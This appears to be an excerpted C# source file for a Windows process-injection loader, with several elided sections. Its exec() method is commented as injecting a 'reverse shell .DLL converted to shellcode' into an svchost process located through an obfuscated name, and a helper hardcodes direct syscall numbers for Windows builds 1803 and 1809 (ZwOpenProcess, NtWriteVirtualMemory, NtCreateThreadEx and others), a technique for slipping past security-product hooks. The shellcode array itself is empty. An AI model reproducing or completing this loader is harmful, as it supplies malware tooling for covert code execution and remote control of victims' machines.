...
namespace ZwCreateProcesstest
{
    class Program
    {
        ...
        public delegate int ZwCreateProcess(IntPtr phProcess,
            int desiredAccess,
            IntPtr objectAttributes,
            IntPtr hParentProcess,
            bool bInheritParentHandles,
            int hSection,
            int hDebugPort,
            int hExceptionPort);
        ...
        {
            var dll = LoadLibrary("ntdll.dll");
            var res = GetProcAddress(dll, "ZwCreateProcess");
            var section = GetProcAddress(dll, "NtCreateSection");
            var s = (ZwCreateProcess)Marshal.GetDelegateForFunctionPointer(res, typeof(ZwCreateProcess));
            //IntPtr hSection, threadHandle;
            //var status = Code.NtCreateProcess(out threadHandle, 0x001FFFFF, IntPtr.Zero,
            //    Marshal.StringToHGlobalAnsi("C:\\Windows\\system32\\notepad.exe"), false, IntPtr.Zero, IntPtr.Zero,
            //    IntPtr.Zero);
            var d = (ZwCreateProcess)Marshal.GetDelegateForFunctionPointer(res, typeof(ZwCreateProcess));
            var result = d.Invoke(Marshal.StringToHGlobalAnsi("C:\\Windows\\system32\\notepad.exe"),
                0x001FFFFF,
        ...
        public class Code
        {
            ...
            public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
            ...
            public const long FILE_GENERIC_READ =
                STANDARD_RIGHTS_READ | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | SYNCHRONIZE;

            public const long FILE_GENERIC_WRITE = STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES |
                                                   FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE;

            public const long FILE_GENERIC_EXECUTE =
            ...
            public static void exec()
            {
                // name = svchost
                string name = "                   ?                      ?   ?        ?               ?                   ?                    ?";
                // scode = reverse shell .DLL converted to shellcode
                byte[] scode = new byte[0] { };

                int ProcId = FindUserPID(ResolvProcessName(name));
                //System.Windows.Forms.MessageBox.Show(ProcId.ToString()); // Use this to compare that the correct ID is resolved, svchost must be started by user
            ...
            public static byte[] GetOSVersionAndReturnSyscall(byte sysType)
            {
                ...
                {
                    // ZwOpenProcess
                    if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtCreateThreadEx
                    if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtWriteVirtualMemory
                    if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtAllocateVirtualMemory
                    if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtCreateSection
                    if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtMapViewOfSection
                    if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtCreateProcess
                      ...
                      if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                {
                    ...
                    // NtCreateThreadEx
                    if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtWriteVirtualMemory
                    if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                      ...
                      if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                {
                    ...
                    // NtCreateThreadEx
                    if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
                    // NtWriteVirtualMemory
                    if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[i]--; } }
                    else
